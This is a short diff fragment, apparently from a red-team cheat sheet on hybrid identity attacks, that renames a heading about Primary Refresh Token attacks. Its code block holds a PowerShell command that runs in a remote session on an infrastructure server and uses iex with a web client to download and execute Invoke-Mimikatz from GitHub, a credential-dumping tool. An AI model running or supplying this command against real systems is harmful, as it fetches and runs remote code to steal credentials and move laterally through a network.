@@ -1,6 +1,6 @@
 ### Hybrid Identity
 
-### Pass-the-PRT attack
+### Primary Refresh Token (PRT) attack
 ```
 Invoke-Command -
 Session $infradminsrv -ScriptBlock{iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")}
